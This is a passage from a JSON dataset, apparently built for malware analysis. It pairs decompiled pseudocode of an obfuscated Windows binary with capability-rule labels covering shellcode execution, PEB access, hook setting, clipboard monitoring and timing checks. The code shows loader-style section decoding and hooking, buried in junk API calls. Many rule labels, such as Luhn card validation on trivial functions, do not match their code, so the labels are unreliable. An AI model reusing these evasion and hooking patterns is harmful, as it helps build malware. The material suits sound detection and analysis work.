            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid fcn.004015ce(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iStack124;\n    uint uStack112;\n    int32_t iStack92;\n    uint uStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    uint32_t uStack76;\n    uint32_t uStack72;\n    uint uStack68;\n    int32_t aiStack64 [3];\n    int32_t iStack52;\n    int32_t iStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_bp_4h;\n    \n    uStack20 = 0;\n    uStack24 = 0x491d4db4;\n    uStack28 = 0x5343bac5;\n    uStack72 = 0x4799d3c3;\n    uStack68 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(aiStack64);\n    iStack92 = 0;\n    do {\n        iStack80 = iStack92;\n        uStack88 = 0x972;\n        uVar4 = uStack76 ^ 0x92b098e | uStack72;\n        (*_sym.imp.KERNEL32.dll_GetConsoleProcessList)(&uStack88, 0x5343bac6 - iStack32);\n        (*_sym.imp.USER32.dll_GetSysColor)(uStack112);\n        uVar1 = (*_sym.imp.USER32.dll_IsDlgButtonChecked)(0x9821e7, iStack92 + 0x4e1);\n        if (uVar1 != uVar4) {\n            return;\n        }\n        iVar2 = iStack52 + -0x5343ab10;\n        uVar5 = 0x5737ed;\n        uVar3 = (*_sym.imp.USER32.dll_GetMenuState)(0x5737ed, iVar2, iVar2);\n        (*_sym.imp.KERNEL32.dll_GetThreadPriority)(0x578306, uVar5, iVar2, 0x5343bbd0 - aiStack64[0], uVar3);\n        iStack92 = iStack84;\n    } while (iStack84 < iStack124);\n    return;\n}\n",
        "token_count": 532
    },
    "0040194b": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nuint fcn.0040194b(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_bp_8h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 98
    },
    "00401b25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b25(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    int32_t iStack20;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    iStack20 = -1;\n    if ((iVar1 != 0) && (iStack20 = iVar1,  iVar1 == 1)) {\n        iStack20 = 0;\n    }\n    return iStack20;\n}\n",
        "token_count": 111
    },
    "00401ff3": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401ff3(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t arg_8h_00;\n    uint32_t uVar4;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_30h = 0;\n    var_40h = 0;\n    do {\n        var_30h = (*(var_40h * 0x70 + 0x405098) ^ *(var_40h * 0x70 + 0x405094)) + var_30h;\n        var_40h = var_40h + 1;\n    } while (var_40h != 5);\n    arg_8h_00 = fcn.004010f3(4, var_30h);\n    var_1ch = 0;\n    var_2ch = 0;\n    do {\n        iVar1 = *(var_2ch * 0x70 + 0x405044);\n        uVar2 = *(var_2ch * 0x70 + 0x405098);\n        uVar3 = *(var_2ch * 0x70 + 0x405094);\n        uVar4 = uVar3 ^ uVar2;\n        var_18h = 0;\n        if (uVar2 != uVar3) {\n            do {\n                *(var_1ch + arg_8h_00 + var_18h) = *(iVar1 + var_18h);\n                var_18h = var_18h + 1;\n            } while (var_18h != uVar4);\n        }\n        var_1ch = uVar4 + var_1ch;\n        var_2ch = var_2ch + 1;\n    } while (var_2ch != 5);\n    fcn.00401dd6(arg_8h_00, arg_8h_00, var_30h);\n    arg_8h[3] = 0x4960;\n    arg_8h[1] = 0x12a00;\n    arg_8h[2] = arg_8h_00 + 0x9f0;\n    *arg_8h = arg_8h_00 + 0x55e5;\n    return 0;\n}\n",
        "token_count": 640
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_6h\n\nint16_t __cdecl fcn.00401000(uint arg_8h)\n\n{\n    uint var_6h;\n    \n    // [00] -r-x section size 12288 named .text\n    if (arg_8h - 0x61U < 0x1a) {\n        arg_8h._0_2_ = arg_8h + -0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 112
    },
    "00401220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401220(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = arg_8h & 7;\n    if (arg_8h < 8) {\n        uVar1 = arg_8h;\n    }\n    return uVar1;\n}\n",
        "token_count": 81
    },
    "00401248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401248(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    arg_8h[3] = 0x4960;\n    arg_8h[1] = 0x12a00;\n    arg_8h[2] = arg_ch + 0x9f0;\n    *arg_8h = arg_ch + 0x55e5;\n    return;\n}\n",
        "token_count": 105
    },
    "0040127e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040127e(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00401baf(&var_20h, 0x40429e, 0x10);\n    arg_8h = fcn.00401a13();\n    fcn.0040314e(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 104
    },
    "004012c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012c5(void)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = 0x374b6ee1;\n    var_24h = 0xc43;\n    (*_sym.imp.KERNEL32.dll_ApplicationRecoveryInProgress)(&var_24h);\n    (*_sym.imp.GDI32.dll_CloseMetaFile)(0xbbf10e);\n    (*_sym.imp.GDI32.dll_SetLayout)(0x8c231f, var_4h ^ 0x374b64ac);\n    (*_sym.imp.USER32.dll_ReplyMessage)(0x37dcfa1d - var_4h);\n    (*_sym.imp.USER32.dll_TranslateMessage)(&var_20h);\n    return;\n}\n",
        "token_count": 215
    },
    "0040133a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "monitor clipboard content"
        ],
        "decompiled_code": "\nvoid fcn.0040133a(void)\n\n{\n    int32_t iVar1;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x10beace1;\n    var_24h = 0;\n    do {\n        (*_sym.imp.GDI32.dll_OffsetRgn)(0x494dab, 0xba3, 0x5fa);\n        (*_sym.imp.USER32.dll_AddClipboardFormatListener)(0x221222);\n        (*_sym.imp.USER32.dll_DrawEdge)(0xf2aa7, &var_18h, 0x69, 0xfb2);\n        sub.USER32.dll_DdeGetLastError(0x1ef);\n        (*_sym.imp.USER32.dll_AnimateWindow)(0x32adcd, 0x5f0, 0xd41);\n        iVar1 = 0x10beb88e - var_4h;\n        (*_sym.imp.KERNEL32.dll_AllocConsole)();\n        var_8h = 0xc8c;\n        (*_sym.imp.KERNEL32.dll_NotifyUILanguageChange)(iVar1, 0x4042ae, 0x4042ae, iVar1, &var_8h);\n        (*_sym.imp.GDI32.dll_SetMetaRgn)(0x8ee598);\n        var_24h = var_24h + 1;\n    } while (var_24h != 0x2ee);\n    return;\n}\n",
        "token_count": 424
    },
    "004019c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004019c7(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    var_ch = -1;\n    if ((iVar1 != 0) && (var_ch = iVar1,  iVar1 == 1)) {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 119
    },
    "004021c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021c3(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    \n    *(arg_8h + arg_10h) = *(arg_ch + arg_10h) - arg_14h;\n    return;\n}\n",
        "token_count": 101
    },
    "004023d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.004023d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar2 = arg_8h + *(arg_8h + 0x3c);\n    if (*(arg_8h + *(arg_8h + 0x3c)) == 'P') {\n        iVar1 = 0;\n        if (*(iVar2 + 1) == 'E') {\n            iVar1 = iVar2;\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "00402669": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402669(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401a13();\n    fcn.0040314e(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 74
    },
    "00402687": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402687(void)\n\n{\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint *var_8ch;\n    int32_t var_88h;\n    uint *var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6eh;\n    uint var_5ah;\n    char var_13h;\n    uint16_t var_12h;\n    uint var_10h;\n    \n    var_84h = &var_6eh;\n    var_10h = 0x6c733385;\n    var_12h = 0x5335;\n    var_13h = -0x6f;\n    fcn.00401baf(var_84h, 0x4041e0, 0xb);\n    var_88h = 0;\n    var_8ch = &var_5ah;\n    do {\n        if (*var_84h == -0x6f - var_13h) {\n            *var_8ch = var_12h ^ 0x5335;\n            break;\n        }\n        *var_8ch = *var_84h;\n        var_84h = var_84h + 1;\n        var_8ch = var_8ch + 2;\n        var_88h = var_88h + 1;\n    } while (var_88h != 0x14);\n    fcn.00402408(&var_5ah, 0);\n    return;\n}\n",
        "token_count": 361
    },
    "00402c7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "set application hook"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004030eb) overlaps instruction at (ram,0x004030e8)\n// \n\nuint32_t fcn.00402c7e(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *extraout_ECX_06;\n    int32_t *extraout_ECX_07;\n    int32_t *extraout_ECX_08;\n    int32_t *piVar6;\n    int32_t *extraout_ECX_09;\n    int32_t *extraout_ECX_10;\n    int32_t *extraout_ECX_11;\n    int32_t *extraout_ECX_12;\n    uint8_t extraout_DH;\n    uint8_t extraout_DH_00;\n    uint8_t extraout_DH_01;\n    uint8_t extraout_DH_02;\n    int32_t iVar7;\n    unkbyte3 Var8;\n    uint32_t *unaff_EBX;\n    uint32_t *puVar9;\n    uint32_t *puVar10;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t iVar11;\n    bool bVar12;\n    uchar in_XMM6 [16];\n    ulong uVar13;\n    uint32_t uVar14;\n    uint32_t var_10h;\n    uint var_ch;\n    \n    uVar13 = (*_sym.imp.ole32.dll_CoCreateInstance)();\n    uVar5 = uVar13;\n    *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n    iVar7 = CONCAT31(uVar13 >> 0x28, 0x72);\n    *0x84eb383b = uVar13;\n    *extraout_ECX = (*extraout_ECX - unaff_EDI) - (uVar5 < 0x279eff52);\n    uVar3 = uVar13 + 0xa1;\n    uVar14 = uVar5 & 0xffffff00 | uVar3;\n    *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n    piVar6 = extraout_ECX;\n    puVar9 = unaff_EBX;\n    if (-1 < *0x71f8d9ca) goto code_r0x00402d12;\n    puVar9 = unaff_EBX & 0xffff00ff;\n    in_XMM6 = minps(in_XMM6, *(extraout_ECX + -0x42));\n    puVar1 = uVar14 + 0x4ead92c3;\n    uVar2 = extraout_ECX & 7;\n    *puVar1 = *puVar1 << uVar2 | *puVar1 >> 8 - uVar2;\n    LOCK();\n    iVar11 = 0;\n    unaff_ESI = 0x1;\n    uVar14 = 0xfffffffe;\n    if ((var_10h & 1) == 0) {\n        uVar5 = (*0x403334)(0xfffffffe, \n                            uVar5 & 0xffff0000 |\n                            CONCAT11((((uVar5 & 0xffffff00) >> 8) - *(iVar7 + 0x45898685)) -\n                                     ((extraout_ECX & 0x1f) != 0 && (*puVar1 & 1) != 0), uVar3));\n        *0xffffff86 = *0xffffff86 & 0x9b;\n        *0x84eb383b = uVar5;\n        *extraout_ECX_06 = *extraout_ECX_06 - (uVar5 < 0x279eff52);\n        *0x71f8d9ca = *0x71f8d9ca & extraout_DH;\n        if (-1 < *0x71f8d9ca) {\n            puVar9 = unaff_EBX & 0xffff0000 | puVar9 + 0x92;\n            unaff_ESI = 0x4;\n            uVar5 = *0x1;\n            piVar6 = extraout_ECX_06;\n            goto code_r0x00402f48;\n        }\n        in_XMM6 = minps(in_XMM6, *(extraout_ECX_06 + -0x42));\n        puVar1 = (uVar5 & 0xffffff00 | uVar5 + 0xa1) + 0x4ead92c3;\n        uVar3 = extraout_ECX_06 & 7;\n        *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n        LOCK();\n        uVar14 = 6;\n        if ((var_10h & 1) == 0) {\ncode_r0x00402d3d:\n            unaff_EDI = iVar11 + -1;\n            uVar13 = (*0x403340)();\n            *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n            iVar7 = CONCAT31(uVar13 >> 0x28, 0x72);\n            *0x84eb383b = uVar13;\n            *extraout_ECX_01 = (*extraout_ECX_01 - unaff_EDI) - (uVar13 < 0x279eff52);\n            uVar14 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n            *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n            if (-1 < *0x71f8d9ca) goto code_r0x00402dc3;\n            unaff_EDI = iVar11 + -2;\n            in_XMM6 = minps(in_XMM6, *(extraout_ECX_01 + -0x42));\n            puVar1 = uVar14 + 0x4ead92c3;\n            uVar3 = extraout_ECX_01 & 7;\n            *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n            bVar12 = (extraout_ECX_01 & 0x1f) != 0 && (*puVar1 & 1) != 0;\ncode_r0x00402d75:\n            LOCK();\n            if (var_10h == (uVar14 & 0xffff0000 | CONCAT11(((uVar14 >> 8) - *(iVar7 + 0x45898685)) - bVar12, uVar14))) {\n                uVar13 = (*_sym.imp.USER32.dll_SendMessageCallbackW)();\n                *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                Var8 = uVar13 >> 0x28;\n                *0x84eb383b = uVar13;\n                *extraout_ECX_10 = (*extraout_ECX_10 - unaff_EDI) - (uVar13 < 0x279eff52);\n                uVar5 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n                *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                if (*0x71f8d9ca < '\\0') {\n                    uVar14 = puVar9 & 0xffff00ff;\n                    iVar11 = unaff_EDI + -1;\n                    in_XMM6 = minps(in_XMM6, *(extraout_ECX_10 + -0x42));\n                    puVar1 = uVar5 + 0x4ead92c3;\n                    uVar3 = extraout_ECX_10 & 7;\n                    *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                    bVar12 = (extraout_ECX_10 & 0x1f) != 0 && (*puVar1 & 1) != 0;\n                    goto code_r0x00403049;\n                }\n                uVar5 = *unaff_ESI;\n                unaff_ESI = unaff_ESI + 3;\n                piVar6 = extraout_ECX_10;\n                goto code_r0x0040308d;\n            }\ncode_r0x00402e77:\n            do {\n                uVar13 = (*_sym.imp.USER32.dll_SetWindowsHookExW)();\n                *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                iVar7 = CONCAT31(uVar13 >> 0x28, 0x72);\n                *0x84eb383b = uVar13;\n                *extraout_ECX_05 = (*extraout_ECX_05 - unaff_EDI) - (uVar13 < 0x279eff52);\n                uVar5 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n                *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                piVar6 = extraout_ECX_05;\n                if (-1 < *0x71f8d9ca) {\n                    return uVar5;\n                }\n                do {\n                    uVar14 = puVar9 & 0xffff00ff;\n                    iVar11 = unaff_EDI + -1;\n                    in_XMM6 = minps(in_XMM6, *(piVar6 + -0x42));\n                    puVar1 = uVar5 + 0x4ead92c3;\n                    uVar3 = piVar6 & 7;\n                    *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                    LOCK();\n                    if ((var_10h & 1) !=\n                        (uVar5 & 0xffff0000 |\n                        CONCAT11(((uVar5 >> 8) - *(iVar7 + 0x45898685)) - ((piVar6 & 0x1f) != 0 && (*puVar1 & 1) != 0), \n                                 uVar5))) {\n                        return 0xfffffffa;\n                    }\n                    uVar13 = (*0x40340c)();\n                    *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                    Var8 = uVar13 >> 0x28;\n                    *0x84eb383b = uVar13;\n                    *extraout_ECX_09 = (*extraout_ECX_09 - iVar11) - (uVar13 < 0x279eff52);\n                    uVar5 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n                    *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                    piVar6 = extraout_ECX_09;\n                    if (-1 < *0x71f8d9ca) {\n                        bVar12 = 0x6d < uVar14;\n                        uVar14 = puVar9 & 0xffff0000 | uVar14 + 0x92;\n                        uVar5 = *unaff_ESI;\n                        unaff_ESI = unaff_ESI + 3;\ncode_r0x00403049:\n                        LOCK();\n                        if (((uVar5 & 0xffff0000 |\n                             CONCAT11(((uVar5 >> 8) - *(CONCAT31(Var8, 0x72) + 0x45898685)) - bVar12, uVar5)) & var_10h)\n                            != 0) {\n                            return 0xfffffffb;\n                        }\n                        uVar13 = (*0x4033ac)();\n                        uVar5 = uVar13;\n                        *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                        *0x84eb383b = uVar13;\n                        *extraout_ECX_12 = (*extraout_ECX_12 - iVar11) - (uVar5 < 0x279eff52);\n                        uVar3 = uVar13 + 0xa1;\n                        *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                        if (-1 < *0x71f8d9ca) {\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\n                        puVar9 = uVar14 & 0xffff0000 | CONCAT11(0xfd, uVar14);\n                        iVar11 = iVar11 + -1;\n                        in_XMM6 = minps(in_XMM6, *(extraout_ECX_12 + -0x42));\n                        puVar1 = (uVar5 & 0xffffff00 | uVar3) + 0x4ead92c3;\n                        uVar2 = extraout_ECX_12 & 7;\n                        *puVar1 = *puVar1 << uVar2 | *puVar1 >> 8 - uVar2;\n                        LOCK();\n                        if ((var_10h & 1) !=\n                            (uVar5 & 0xffff0000 |\n                            CONCAT11((((uVar5 & 0xffffff00) >> 8) - *(CONCAT31(uVar13 >> 0x28, 0x72) + 0x45898685)) -\n                                     ((extraout_ECX_12 & 0x1f) != 0 && (*puVar1 & 1) != 0), uVar3))) {\n                            return 0xfffffff6;\n                        }\n                        uVar14 = (*0x40334c)();\n                        *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                        cVar4 = uVar14;\n                        *0x84eb383b = cVar4;\n                        *extraout_ECX_08 = (*extraout_ECX_08 - iVar11) - (uVar14 < 0x279eff52);\n                        uVar5 = uVar14 & 0xffffff00 | cVar4 + 0xa1;\n                        *0x71f8d9ca = *0x71f8d9ca & extraout_DH_01;\n                        piVar6 = extraout_ECX_08;\n                        if (*0x71f8d9ca < '\\0') goto code_r0x00402fa3;\n                        uVar5 = uVar14 & 0xffffff00 | cVar4 + 0xa4;\n                        uVar14 = *puVar9;\n                        *puVar9 = puVar9;\n                    }\n                    in_XMM6 = minps(in_XMM6, *(piVar6 + -0x42));\n                    puVar1 = uVar5 + 0x4ead92c3;\n                    uVar3 = piVar6 & 7;\n                    *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                    LOCK();\n                    puVar10 = uVar14 & 0xffff00ff;\n                    unaff_EDI = iVar11 + -1;\n                    if (var_10h == 0) {\n                        return 0x1b87c72a;\n                    }\n                    do {\n                        iVar11 = unaff_EDI;\n                        puVar9 = puVar10;\n                        uVar5 = (*0x403334)();\n                        *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                        *0x84eb383b = uVar5;\n                        *extraout_ECX_07 = (*extraout_ECX_07 - iVar11) - (uVar5 < 0x279eff52);\n                        uVar5 = uVar5 & 0xffffff00 | uVar5 + 0xa1;\n                        *0x71f8d9ca = *0x71f8d9ca & extraout_DH_00;\n                        piVar6 = extraout_ECX_07;\n                        if (*0x71f8d9ca < '\\0') goto code_r0x00402f48;\ncode_r0x00402fa3:\n                        puVar10 = puVar9 & 0xffff0000 | puVar9;\n                        unaff_EDI = iVar11 + -1;\n                        in_XMM6 = minps(in_XMM6, *(piVar6 + -0x42));\n                        puVar1 = uVar5 + 0x4ead92c3;\n                        uVar3 = piVar6 & 7;\n                        *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                        LOCK();\n                    } while (var_10h != 0);\n                    uVar13 = (*_sym.imp.USER32.dll_DestroyAcceleratorTable)();\n                    *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                    Var8 = uVar13 >> 0x28;\n                    *0x84eb383b = uVar13;\n                    *extraout_ECX_02 = (*extraout_ECX_02 - unaff_EDI) - (uVar13 < 0x279eff52);\n                    uVar5 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n                    *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                    piVar6 = extraout_ECX_02;\n                    if (-1 < *0x71f8d9ca) goto code_r0x00402e08;\n                    puVar9 = puVar9 & 0xffff0000 | puVar9;\n                    unaff_EDI = iVar11 + -2;\n                    in_XMM6 = minps(in_XMM6, *(extraout_ECX_02 + -0x42));\n                    puVar1 = uVar5 + 0x4ead92c3;\n                    uVar3 = extraout_ECX_02 & 7;\n                    *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                    LOCK();\n                    uVar14 = 0;\ncode_r0x00402dc3:\n                    if ((var_10h & 1) != 0) {\n                        return uVar14;\n                    }\n                    uVar13 = (*_sym.imp.SHLWAPI.dll_StrRChrW)();\n                    uVar14 = uVar13;\n                    *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                    iVar7 = CONCAT31(uVar13 >> 0x28, 0x72);\n                    *0x84eb383b = uVar13;\n                    *extraout_ECX_04 = (*extraout_ECX_04 - unaff_EDI) - (uVar14 < 0x279eff52);\n                    uVar3 = uVar13 + 0xa1;\n                    uVar5 = uVar14 & 0xffffff00 | uVar3;\n                    *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                    piVar6 = extraout_ECX_04;\n                } while (-1 < *0x71f8d9ca);\n                unaff_EDI = unaff_EDI + -1;\n                in_XMM6 = minps(in_XMM6, *(extraout_ECX_04 + -0x42));\n                puVar1 = uVar5 + 0x4ead92c3;\n                uVar2 = extraout_ECX_04 & 7;\n                *puVar1 = *puVar1 << uVar2 | *puVar1 >> 8 - uVar2;\n                uVar5 = uVar14 & 0xffff0000 |\n                        CONCAT11((((uVar14 & 0xffffff00) >> 8) - *(iVar7 + 0x45898685)) -\n                                 ((extraout_ECX_04 & 0x1f) != 0 && (*puVar1 & 1) != 0), uVar3);\n                LOCK();\n                while( true ) {\n                    if ((var_10h & 1) != uVar5) {\n                        return 0xfffffff6;\n                    }\n                    do {\n                        uVar5 = (*_sym.imp.KERNEL32.dll_LocalFileTimeToFileTime)();\n                        *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                        *0x84eb383b = uVar5;\n                        *extraout_ECX_11 = (*extraout_ECX_11 - unaff_EDI) - (uVar5 < 0x279eff52);\n                        uVar5 = uVar5 & 0xffffff00 | uVar5 + 0xa1;\n                        *0x71f8d9ca = *0x71f8d9ca & extraout_DH_02;\n                        piVar6 = extraout_ECX_11;\n                        if (-1 < *0x71f8d9ca) {\n                            *(extraout_ECX_11 + -0x9460fbb) = extraout_ECX_11;\n    // WARNING: Bad instruction - Truncating control flow here\n                            halt_baddata();\n                        }\ncode_r0x0040308d:\n                        puVar9 = puVar9 & 0xffff00ff;\n                        unaff_EDI = unaff_EDI + -1;\n                        in_XMM6 = minps(in_XMM6, *(piVar6 + -0x42));\n                        puVar1 = uVar5 + 0x4ead92c3;\n                        uVar3 = piVar6 & 7;\n                        *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                        LOCK();\n                    } while (var_10h != 0);\n                    uVar13 = (*0x403346)();\n                    *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                    iVar7 = CONCAT31(uVar13 >> 0x28, 0x72);\n                    *0x84eb383b = uVar13;\n                    *extraout_ECX_00 = (*extraout_ECX_00 - unaff_EDI) - (uVar13 < 0x279eff52);\n                    uVar14 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n                    piVar6 = extraout_ECX_00;\ncode_r0x00402d12:\n                    bVar12 = false;\n                    *0x71f8d9ca = *0x71f8d9ca & iVar7 >> 8;\n                    if (-1 < *0x71f8d9ca) goto code_r0x00402d75;\n                    puVar9 = puVar9 & 0xffff00ff;\n                    unaff_EDI = unaff_EDI + -1;\n                    in_XMM6 = minps(in_XMM6, *(piVar6 + -0x42));\n                    puVar1 = uVar14 + 0x4ead92c3;\n                    uVar3 = piVar6 & 7;\n                    *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                    LOCK();\n                    if (var_10h != 0) break;\n                    while( true ) {\n                        uVar13 = (*0x4033a6)();\n                        *(unaff_ESI + -0x7b) = *(unaff_ESI + -0x7b) & 0x9b;\n                        Var8 = uVar13 >> 0x28;\n                        *0x84eb383b = uVar13;\n                        *extraout_ECX_03 = (*extraout_ECX_03 - unaff_EDI) - (uVar13 < 0x279eff52);\n                        uVar5 = uVar13 & 0xffffff00 | uVar13 + 0xa1;\n                        *0x71f8d9ca = *0x71f8d9ca & uVar13 >> 0x28;\n                        if (-1 < *0x71f8d9ca) break;\n                        unaff_EDI = unaff_EDI 